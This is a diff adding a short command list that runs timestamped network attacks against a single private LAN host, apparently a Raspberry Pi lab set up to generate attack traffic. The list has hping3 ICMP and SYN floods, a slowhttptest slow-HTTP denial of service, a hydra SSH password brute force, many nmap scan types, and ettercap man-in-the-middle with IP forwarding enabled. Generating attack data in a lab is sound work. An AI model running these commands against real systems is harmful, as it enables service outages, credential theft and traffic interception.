@@ -1,0 +1,30 @@
+sudo ./datetime.sh sudo hping3 --icmp --flood 192.168.178.81
+sudo ./datetime.sh sudo hping3 -S -p 80 --flood 192.168.178.81
+sudo ./datetime.sh slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://192.168.178.81:5000/ -x 24 -p 3
+
+sudo ./datetime.sh sudo hydra -l pi -P piPass2.txt ssh://192.168.178.81
+
+sudo ./datetime.sh nmap 192.168.178.81
+sudo ./datetime.sh nmap -sS 192.168.178.81
+sudo ./datetime.sh nmap -sT 192.168.178.81
+sudo ./datetime.sh nmap -sA 192.168.178.81
+sudo ./datetime.sh nmap -sW 192.168.178.81
+sudo ./datetime.sh nmap -sM 192.168.178.81
+sudo ./datetime.sh nmap 192.168.178.81 -PR
+sudo ./datetime.sh nmap 192.168.178.81 -sV 
+sudo ./datetime.sh nmap 192.168.178.81 -A
+sudo ./datetime.sh nmap 192.168.178.81 -O
+sudo ./datetime.sh nmap 192.168.178.81 -sC
+sudo ./datetime.sh nmap -sU 192.168.178.81
+
+sysctl net.ipv4.ip_forward=1
+sudo ./datetime.sh ettercap -G
+
+==============================================================================
+python3 run_for_duration.py <sec> "<command>"
+
+
+
+
+
+
